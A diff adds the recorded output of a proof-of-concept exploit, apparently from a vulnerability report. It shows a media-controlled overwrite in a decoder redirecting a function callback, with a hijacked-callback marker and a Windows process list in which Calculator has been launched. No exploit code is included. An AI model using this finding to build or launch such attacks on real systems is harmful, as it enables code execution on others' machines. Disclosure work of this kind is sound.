@@ -1,0 +1,16 @@
+PoC output:
+[addr] benign_callback=0x5fec957072c9
+[addr] calc_callback=0x5fec957072e3
+[ptr] frame1 callback after decode=0x5fec957072c9
+[ptr] frame2 callback after decode=0x5fec957072e3
+[ptr] expected target=0x5fec957072e3
+[ok] media-controlled RASC DLTA overwrite redirected callback
+[callback] hijacked callback reached
+marker:present
+
+Windows processes after PoC:
+
+ProcessName             Id StartTime
+-----------             -- ---------
+ApplicationFrameHost 24728 6/25/2026 9:55:34 PM
+CalculatorApp        26628 6/26/2026 12:25:53 PM
